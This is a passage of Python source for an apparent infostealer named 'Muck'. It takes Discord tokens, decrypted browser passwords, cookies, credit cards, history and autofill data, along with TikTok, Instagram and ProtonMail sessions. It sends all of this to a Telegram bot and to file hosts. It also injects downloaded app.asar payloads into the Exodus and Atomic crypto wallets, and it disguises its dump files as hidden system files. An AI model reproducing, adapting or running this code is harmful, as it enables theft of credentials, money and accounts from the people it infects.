            elif methode["type"] == 2:
                billing += ":parking: "

    return billing

def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]

    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges




# $$\      $$\ $$\   $$\  $$$$$$\  $$\   $$\ 
# $$$\    $$$ |$$ |  $$ |$$  __$$\ $$ | $$  |
# $$$$\  $$$$ |$$ |  $$ |$$ /  \__|$$ |$$  / 
# $$\$$\$$ $$ |$$ |  $$ |$$ |      $$$$$  /  
# $$ \$$$  $$ |$$ |  $$ |$$ |      $$  $$<   
# $$ |\$  /$$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  
# $$ | \_/ $$ |\$$$$$$  |\$$$$$$  |$$ | \$$\ 
# \__|     \__| \______/  \______/ \__|  \__|
                                           
                                           
                                           





def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"] and not badge["Name"] == "Active_Developer":
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | **{friend['user']['username']}#{friend['user']['discriminator']}** `({friend['user']['id']})`\n"
    return uhqlist if uhqlist != '' else "`No HQ Friends`"




# $$\      $$\ $$\   $$\  $$$$$$\  $$\   $$\ 
# $$$\    $$$ |$$ |  $$ |$$  __$$\ $$ | $$  |
# $$$$\  $$$$ |$$ |  $$ |$$ /  \__|$$ |$$  / 
# $$\$$\$$ $$ |$$ |  $$ |$$ |      $$$$$  /  
# $$ \$$$  $$ |$$ |  $$ |$$ |      $$  $$<   
# $$ |\$  /$$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  
# $$ | \_/ $$ |\$$$$$$  |\$$$$$$  |$$ | \$$\ 
# \__|     \__| \______/  \______/ \__|  \__|
                                           
                                           
                                           





def GetUHQGuilds(token):
    try:
        uhqguilds = ""
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        guilds = loads(urlopen(Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)).read().decode())
        for guild in guilds:
            if guild["approximate_member_count"] < 50: continue
            if guild["owner"] or guild["permissions"] == "4398046511103":
                inv = loads(urlopen(Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)).read().decode())    
                try:    cc = "https://discord.gg/"+str(inv[0]['code'])
                except: cc = False
                uhqguilds += f"<:I_Join:928302098284691526> [{guild['name']}]({cc}) `({guild['id']})` **{str(guild['approximate_member_count'])} Members**\n"
        if uhqguilds == "": return "`No HQ Guilds`"
        return uhqguilds
    except:
        return "`No HQ Guilds`"

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson:
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`' if userjson["phone"] != None else "-"

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

class ttsign: #this is the cleanest code ive ever written
    def __init__(self,params:str,data:str,cookies:str)->None:self.params,self.data,self.cookies=params,data,cookies
    def hash(self,data:str)->str:return str(hashlib.md5(data.encode()).hexdigest())
    def get_base_string(self)->str:base_str=self.hash(self.params);base_str=(base_str+self.hash(self.data)if self.data else base_str+str("0"*32));base_str=(base_str+self.hash(self.cookies)if self.cookies else base_str+str("0"*32));return base_str
    def get_value(self)->json:return self.encrypt(self.get_base_string())
    def encrypt(self,data:str)->json:
     unix,len,key,result,param_list=int(time.time()),0x14,[0xDF,0x77,0xB9,0x40,0xB9,0x9B,0x84,0x83,0xD1,0xB9,0xCB,0xD1,0xF7,0xC2,0xB9,0x85,0xC3,0xD0,0xFB,0xC3],"",[]
     for i in range(0,12,4):
      temp=data[8*i:8*(i+1)]
      for j in range(4):H = int(temp[j*2:(j+1)*2],16);param_list.append(H)
     param_list.extend([0x0,0x6,0xB,0x1C]);H=int(hex(int(unix)),16);param_list.append((H&0xFF000000)>>24);param_list.append((H&0x00FF0000)>>16);param_list.append((H&0x0000FF00)>>8);param_list.append((H&0x000000FF)>>0);eor_result_list = []
     for A,B in zip(param_list,key):eor_result_list.append(A^B)
     for i in range(len):C=self.reverse(eor_result_list[i]);D=eor_result_list[(i + 1)%len];E=C^D;F=self.rbit_algorithm(E);H=((F^0xFFFFFFFF)^len)&0xFF;eor_result_list[i]=H
     for param in eor_result_list:result+=self.hex_string(param)
     return {"x-ss-req-ticket":str(int(unix*1000)),"x-khronos":str(int(unix)),"x-gorgon":("0404b0d30000"+result)}
    def rbit_algorithm(self, num):
     result,tmp_string= "",bin(num)[2:]
     while len(tmp_string)<8:tmp_string="0"+tmp_string
     for i in range(0,8):result=result+tmp_string[7-i]
     return int(result,2)
    def hex_string(self,num):
     tmp_string=hex(num)[2:]
     if len(tmp_string)<2:tmp_string="0"+tmp_string
     return tmp_string
    def reverse(self, num):tmp_string=self.hex_string(num);return int(tmp_string[1:]+tmp_string[:1],16)

def TiktokInfo(sessionid):
    global ttusrnames
    params = f"device_type=SM-G988N&app_name=musical_ly&channel=googleplay&device_platform=android&iid={int(bin(int(time.time()))[2:] + '10100110110100110000011100000101', 2)}&version_code=180805&device_id={int(bin(int(time.time()))[2:] + '00101101010100010100011000000110', 2)}&os_version=7.1.2&aid=1233"
    url = "https://api19-va.tiktokv.com/aweme/v1/user/profile/self/?" + params
    headers = {
        **ttsign(params, None, None).get_value(),
        "Host": "api19-va.tiktokv.com",
        "Connection": "keep-alive",
        "accept-encoding": "gzip",
        "user-agent": "okhttp/3.12.1",
        "passport-sdk-version": "19",
        "sdk-version": "2",
        "cookie": "sessionid={};".format(sessionid)
    }
    res = urlopen(Request(url, headers=headers)).read()
    try:
        jsson = loads(res.decode(errors="ignore"))["user"]
    except:
        jsson = loads(gzip.GzipFile(fileobj=io.BytesIO(res)).read().decode(errors='ignore'))["user"]
    if not jsson["unique_id"] in ttusrnames:
        ttusrnames.append(jsson["unique_id"])
        return [{
            "name": "<:tiktok:883079597187530802> Tiktok", 
            "value": f"**Username:** [{jsson['unique_id']}](https://tiktok.com/@{jsson['unique_id']})\n**Followers:** {jsson['follower_count']}\n**Likes:** {jsson['total_favorited']}", 
            "inline": False
        }]
    return []

def InstagramInfo(token):
    headers = {
        'authority': 'www.instagram.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
        'Cookie': f'sessionid={token}'
    }
    response = str(urlopen(Request('https://www.instagram.com/', headers=headers)).read())
    
    usernam = response.split('\\\\"username\\\\":\\\\"')[1].split('\\\\"')[0]
    idd = response.split(',{"appId":"')[1].split('"')[0]

    headers2 = {
        'accept': '*/*',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
        'x-ig-app-id': idd,
        'Cookie': f'sessionid={token}'
    }
    r2 = loads(urlopen(Request(f'http://i.instagram.com/api/v1/users/web_profile_info/?username={usernam}', None, headers2)).read().decode(errors="ignore"))
    sheeps = r2["data"]["user"]["edge_followed_by"]["count"]
    following = r2["data"]["user"]["edge_follow"]["count"]

    return [{"name": "Instagram", "value": f"**Username:** [{usernam}](https://www.instagram.com/{usernam})\n**Followers:** {sheeps}\n**Following:** {following}", "inline": False}]



# $$\      $$\ $$\   $$\  $$$$$$\  $$\   $$\ 
# $$$\    $$$ |$$ |  $$ |$$  __$$\ $$ | $$  |
# $$$$\  $$$$ |$$ |  $$ |$$ /  \__|$$ |$$  / 
# $$\$$\$$ $$ |$$ |  $$ |$$ |      $$$$$  /  
# $$ \$$$  $$ |$$ |  $$ |$$ |      $$  $$<   
# $$ |\$  /$$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  
# $$ | \_/ $$ |\$$$$$$  |\$$$$$$  |$$ | \$$\ 
# \__|     \__| \______/  \______/ \__|  \__|
                                           
                                           
                                           





def getaccountsinfo():
    global History, Cookies, Bookmarks, Passw
    data = []

    if "instagram" in str(Cookies):
        for line in Cookies:
            if "instagram" in line and "sessionid" in line:
                try: 
                    token = line.split("V41U3: ")[1]
                    data += InstagramInfo(token)
                except: pass
    if "tiktok" in str(Cookies):
        for line in Cookies:
            if "tiktok" in line and "sessionid" in line:
                try: 
                    token = line.split("V41U3: ")[1]
                    data += TiktokInfo(token)
                except: pass
    
    if "protonmail" in str(History):
        for line in History:
            if "proton.me/login" in line and "state=" in line:
                try:
                    token = line.split("state=")[1]
                    if "&" in token:
                        token2 = token.split("&")[0]
                        token = token2
                    data += [{"name": "ProtonMail", "value": f"[URL]({line})\n**Token:** {token}", "inline": False}]
                    break
                except: pass
    upload("Data Searcher", data)

def Trim(obj):
    if len(obj) > 1000: 
        f = obj.split("\n")
        obj = ""
        for i in f:
            if len(obj)+ len(i) >= 1000: 
                obj += "..."
                break
            obj += i + "\n"
    return obj

def uploadToken(token, path):
    global BOT_TOKEN, CHAT_ID
    
    telegram_config = {
        "bot_token": BOT_TOKEN,
        "chat_id": CHAT_ID
    }
    
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
    billing = GetBilling(token)
    badge = GetBadge(flags)
    
    content = f"""🎯 DISCORD TOKEN VOLÉ
    
👤 User: {username}#{hashtag}
📧 Email: {email}
📱 Phone: {phone}
🏆 Badges: {badge}{nitro}
💳 Billing: {billing}
🔑 Token: {token}
📍 IP: {IP}
"""
    
    send_to_telegram(content, telegram_config)

def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

# REMPLACER la fonction upload() ligne ~680 :
def upload(name, link):
    global BOT_TOKEN, CHAT_ID
    
    # Configuration Telegram
    telegram_config = {
        "bot_token": BOT_TOKEN,
        "chat_id": CHAT_ID
    }
    
    # Formater le contenu pour Telegram
    if "Data Searcher" in name:
        content = f"🔍 Data Extractor\n\n"
        for item in link:
            content += f"📊 {item['name']}: {item['value']}\n\n"
    
    elif "kiwi" in name:
        content = f"📁 File Stealer\n\n{link}"
    
    else:
        content = f"📋 {name}\n\n{str(link)}"
    
    # Envoyer via Telegram
    send_to_telegram(content, telegram_config)

def writeforfile(data, name):
    # Noms moins suspects
    name_mapping = {
        'passwords': 'system_cache',
        'cookies': 'browser_data', 
        'creditcards': 'payment_info',
        'autofill': 'form_data',
        'history': 'navigation_log',
        'bookmarks': 'shortcuts',
        'parsedcookies': 'session_data'
    }
    
    safe_name = name_mapping.get(name, name)
    path = os.getenv("TEMP") + f"\\{safe_name}.tmp"
    
    with open(path, mode='w', encoding='utf-8') as f:
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")
    
    # Rendre le fichier caché et système
    try:
        import ctypes
        ctypes.windll.kernel32.SetFileAttributesW(path, 0x02 | 0x04)
    except:
        pass

def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                Tokens += token
                                uploadToken(token, path)


def SqlThing(pathC, tempfold, cmd):
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute(cmd)
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    return data


def FirefoxCookie():
    try:
        global Cookies, CookiCount
        firefoxpath = f"{roaming}/Mozilla/Firefox/Profiles"
        if not os.path.exists(firefoxpath): return
        subprocess.Popen(f"taskkill /im firefox.exe /t /f >nul 2>&1", shell=True)
        for subdir, dirs, files in os.walk(firefoxpath):
            for file in files:
               if file.endswith("cookies.sqlite"):
                    tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
                    shutil.copy2(os.path.join(subdir, file), tempfold)
                    conn = sql_connect(tempfold)
                    cursor = conn.cursor()
                    cursor.execute("select * from moz_cookies ")
                    data = cursor.fetchall()
                    cursor.close()
                    conn.close()
                    os.remove(tempfold)
                    for row in data:
                        if row[0] != '':
                            Cookies.append(f"H057 K3Y: {row[4]} | N4M3: {row[2]} | V41U3: {row[3]}")
                            CookiCount += 1
    except: pass

def getPassw(path, arg):
    try:
        global Passw, PasswCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Login Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SqlThing(pathC, tempfold, "SELECT action_url, username_value, password_value FROM logins;")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '' and row[2]:  # Vérifier URL ET password
                try:
                    decrypted_pass = DecryptValue(row[2], master_key)
                    if decrypted_pass and len(decrypted_pass.strip()) > 0:
                        for wa in keyword:
                            old = wa
                            if "https" in wa:
                                tmp = wa
                                wa = tmp.split('[')[1].split(']')[0]
                            if wa in row[0]:
                                if not old in paswWords: paswWords.append(old)
                        
                        username = row[1] if row[1] else "[NO_USER]"
                        Passw.append(f"UR1: {row[0]} | U53RN4M3: {username} | P455W0RD: {decrypted_pass}")
                        PasswCount += 1
                except Exception as e:
                    pass  # Ignorer erreurs déchiffrement
        writeforfile(Passw, 'passwords')
    except Exception as e:
        pass  # ✅ CORRIGÉ - avec espace et Exception

def getCookie(path, arg):
    try:
        global Cookies, CookiCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SqlThing(pathC, tempfold, "SELECT host_key, name, encrypted_value FROM cookies ")

        pathKey = path + "/Local State"

        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                for wa in keyword:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in cookiWords: cookiWords.append(old)
                Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
                CookiCount += 1
        writeforfile(Cookies, 'cookies')
    except:pass

def getCCs(path, arg):
    try:
        global CCs, CCsCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SqlThing(pathC, tempfold, "SELECT * FROM credit_cards ")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                CCs.append(f"C4RD N4M3: {row[1]} | NUMB3R: {DecryptValue(row[4], master_key)} | EXPIRY: {row[2]}/{row[3]}")
                CCsCount += 1
        writeforfile(CCs, 'creditcards')
    except:pass

def getAutofill(path, arg):
    try:
        global Autofill, AutofillCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SqlThing(pathC, tempfold,"SELECT * FROM autofill WHERE value NOT NULL")

        for row in data:
            if row[0] != '':
                Autofill.append(f"N4M3: {row[0]} | V4LU3: {row[1]}")
                AutofillCount += 1
        writeforfile(Autofill, 'autofill')
    except:pass

def getHistory(path, arg):
    try:
        global History, HistoryCount
        if not os.path.exists(path): return

        pathC = path + arg + "History"
        if os.stat(pathC).st_size == 0: return
        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        data = SqlThing(pathC, tempfold,"SELECT * FROM urls")

        for row in data:
            if row[0] != '':
                History.append(row[1])
                HistoryCount += 1
        writeforfile(History, 'history')
    except:pass

def getwebsites(Words):
    rb = ' | '.join(da for da in Words)
    if len(rb) > 1000:
        rrrrr = Reformat(str(Words))
        return ' | '.join(da for da in rrrrr)
    else: return rb

def getBookmarks(path, arg):
    try:
        global Bookmarks, BookmarksCount
        if not os.path.exists(path): return

        pathC = path + arg + "Bookmarks"
        if os.path.exists(pathC):
            with open(pathC, 'r', encoding='utf8') as f:
                data = loads(f.read())
                for i in data['roots']['bookmark_bar']['children']:
                    try:
                        Bookmarks.append(f"N4M3: {i['name']} | UR1: {i['url']}")
                        BookmarksCount += 1
                    except:pass
        if os.stat(pathC).st_size == 0: return
        writeforfile(Bookmarks, 'bookmarks')
    except:pass

def parseCookies():
    try:
        tmpCookies = []
        for cookie in Cookies:
            try:
                key =   cookie.split(' | ')[0].split(': ')[1]
                name =  cookie.split(' | ')[1].split(': ')[1]
                value = cookie.split(' | ')[2].split(': ')[1]
                tmpCookies.append(f"{key}\tTRUE\t/\tFALSE\t2597573456\t{name}\t{value}")
            except: pass
        writeforfile(tmpCookies, 'parsedcookies')
    except:pass

def startBthread(func, arg):
    global Browserthread
    t = threading.Thread(target=func, args=arg)
    t.start()
    Browserthread.append(t)

def getBrowsers(browserPaths):
    global BOT_TOKEN, CHAT_ID
    global Browserthread
    FirefoxCookie()
    ThCokk, Browserthread, filess = [], [], []
    for patt in browserPaths:
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

        startBthread(getAutofill,       [patt[0], patt[3]])
        startBthread(getHistory,        [patt[0], patt[3]])
        startBthread(getBookmarks,      [patt[0], patt[3]])
        startBthread(getCCs,            [patt[0], patt[3]])
        startBthread(getPassw,          [patt[0], patt[3]])

    for thread in ThCokk: thread.join()
    if Trust(Cookies) == True: __import__('sys').exit(0)
    parseCookies()
    for thread in Browserthread: thread.join()

    for file in ["system_cache.tmp", "browser_data.tmp", "payment_info.tmp", "form_data.tmp", "navigation_log.tmp", "session_data.tmp", "shortcuts.tmp"]:
        filess.append(uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
    headers = {"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}

    data = {
        "content": GLINFO,
        "embeds": [
            {
                "title": "Password Stealer",
                "description": f"**Found**:\n{getwebsites(paswWords)}\n\n**Data:**\n **{PasswCount}** `Passwords Found`\n [Passwords.txt]({filess[0]})",
                "2895667": 14406413,
                "footer": {"text": "Muck | https://github.com/frankxrs/",  "icon_url": "https://i.imgur.com/Npe8QuD.png"}
            },
            {
                "title": "Cookies Stealer",
                "description": f"**Found**:\n{getwebsites(cookiWords)}\n\n**Data:**\n **{CookiCount}** Cookies Found\n [Cookies.txt]({filess[1]})\n [Parsed.txt]({filess[5]})",
                "2895667": 14406413,
                "footer": {"text": "Muck | https://github.com/frankxrs",  "icon_url": "https://i.imgur.com/Npe8QuD.png"}
            },
            {
                "title": "Other",
                "description": f"**{HistoryCount}** Websites Found\n [history.txt]({filess[4]})\n\n **{AutofillCount}** Infos Found\n [autofill.txt]({filess[3]})\n\n **{BookmarksCount}** Bookmarks found\n [bookmarks.txt]({filess[6]})\n\n**{CCsCount}** Creditcards Found\n [creditcards.txt]({filess[2]})",
                "2895667": 14406413,
                "footer": {"text": "Muck | https://github.com/frankxrs",  "icon_url": "https://i.imgur.com/Npe8QuD.png"}
            }
        ],
        "attachments": []
    }
    telegram_config = {
        "bot_token": BOT_TOKEN,
        "chat_id": CHAT_ID
    }
    
    content = f"""🌐 BROWSER DATA STOLEN
    
🔐 {PasswCount} Passwords Found
🍪 {CookiCount} Cookies Found  
💳 {CCsCount} Credit Cards Found
📝 {AutofillCount} Autofill Data Found
🔗 {HistoryCount} History Entries Found
⭐ {BookmarksCount} Bookmarks Found
"""
    
    send_to_telegram(content, telegram_config)
    getaccountsinfo()
    return



def ExodusInjection(path, procc, exolink):
    if not os.path.exists(path): return
    
    listOfFile = os.listdir(path)
    apps = []
    for file in listOfFile:
        if "app-" in file:
            apps += [file]

    try:
        randomexodusfile = f"{path}/{apps[0]}/LICENSE"
        with open(randomexodusfile, 'r+') as IsAlradyInjected:
                check = IsAlradyInjected.read()
                if "gofile" in str(check): # already injected
                    return
    except: pass

    exodusPatchURL = "https://cdn.discordapp.com/attachments/1135684724585681039/1143224080603037827/app.asar"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}
    req = Request(exodusPatchURL, headers=headers)
    response = urlopen(req)

    global hook
    khook = f'{hook.split("webhooks/")[1]}:{exolink}'
    data = response.read()
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    for app in apps:
        try:
            fullpath = f"{path}/{app}/resources/app.asar"
            licpath = f"{path}/{app}/LICENSE"

            with open(fullpath, 'wb') as out_file1:
                out_file1.write(data)
            with open(licpath, 'w') as out_file2:
                out_file2.write(khook)
        except: pass

def AtomicInjection(path, procc, atolink):
    if not os.path.exists(path): return

    try:
        randomexodusfile = f"{path}/LICENSE.electron.txt"
        with open(randomexodusfile, 'r+') as IsAlradyInjected:
                check = IsAlradyInjected.read()
                if "gofile" in str(check):
                    return
    except: pass

    exodusPatchURL = "https://cdn.discordapp.com/attachments/1086668425797058691/1113770559688413245/app.asar"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}
    req = Request(exodusPatchURL, headers=headers)
    response = urlopen(req)

    global hook
    # format: 00000000000/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXX
    khook = f'{hook.split("webhooks/")[1]}:{atolink}'
    # encryptedhook = binascii.hexlify(bytes(hook, "utf8")).decode("utf8", "ignore")
    data = response.read()
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    #for app in apps:
    try:
        fullpath = f"{path}/resources/app.asar"
        licpath = f"{path}/LICENSE.electron.txt"

        with open(fullpath, 'wb') as out_file1:
            out_file1.write(data)
        with open(licpath, 'w') as out_file2:
            out_file2.write(khook)
    except: pass



def GetDiscord(path, arg):

    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg
    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        global Tokens
                        tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if checkToken(tokenDecoded):
                            if not tokenDecoded in Tokens:
                                Tokens += tokenDecoded
                                # writeforfile(Tokens, 'tokens')
                                uploadToken(tokenDecoded, path)
 
def ngstealer(path):
    path = f"{path}\\000003.log"
    if not os.path.exists(path): return
    users = []
    f = open(path, "r+", encoding="ansi")
    accounts = re.findall(r'{"username":".{1,69}","token":"', str(f.readlines()))
    for uss in accounts:
        username = uss.split('{"username":"')[1].split('"')[0]
        if username not in users:
            users += [username]
    
    servers = ["💙 | Blue","🧡 | Orange","💛 | Yellow","🤍 | White","🖤 | Black","💙 | Cyan","💚 | Lime","🧡 | Coral","💗 | Pink","❤️ | Alpha","🖤 | Sigma","💚 | Gamma","🩶 | Omega","💜 | Purple","💚 | Green","❤️ | Red","💜 | Delta","💗 | Ruby"]

    for user in users:

        payname = f"NationsGlory | {user};https://skins.nationsglory.fr/face/{user}/16"
        payload = []

        url = f"https://nationsglory.fr/profile/{user}"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
        try:
            html = str(urlopen(Request(url, headers=headers)).read())

            for server in servers:
                serv = server.split("| ")[1].lower()
                
                data = html.split(f'data-server="{serv}">')[1].split('<div class="card server-tab d-none"')[0]
                if not "pas encore conne" in data:
                    
                    timeplayed = "x"
                    try:

                        timeplayed = data.replace("\n", '').split('>Temps de jeu</h4>\\n<p class="h3 mb-2">\\n')[1].split("</p>")[0].replace("\\", "").replace("n", '')
                        contry = data.replace("\n", '').split(f'><a href="/country/{serv}/')[1].split('">')[0]
                        contryrank = data.replace("\n", '').split('Rang de pays</h4>\\n<p class="h3 mb-2">')[1].split('</p>\\n</div>\\n<div class="c')[0]
                    except:
                        contry, contryrank = "Pas de pays","Pas de rank"
                    
                    if "h" in timeplayed:
                        
                        payload += [{"name": server,"value": f"PlayTime: {timeplayed}\nContry: {contry}\nRank: {contryrank}","inline": True}]
            upload(payname, payload)
        except:
            pass

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for walletids in wallts:
        
        for patt in paths1:
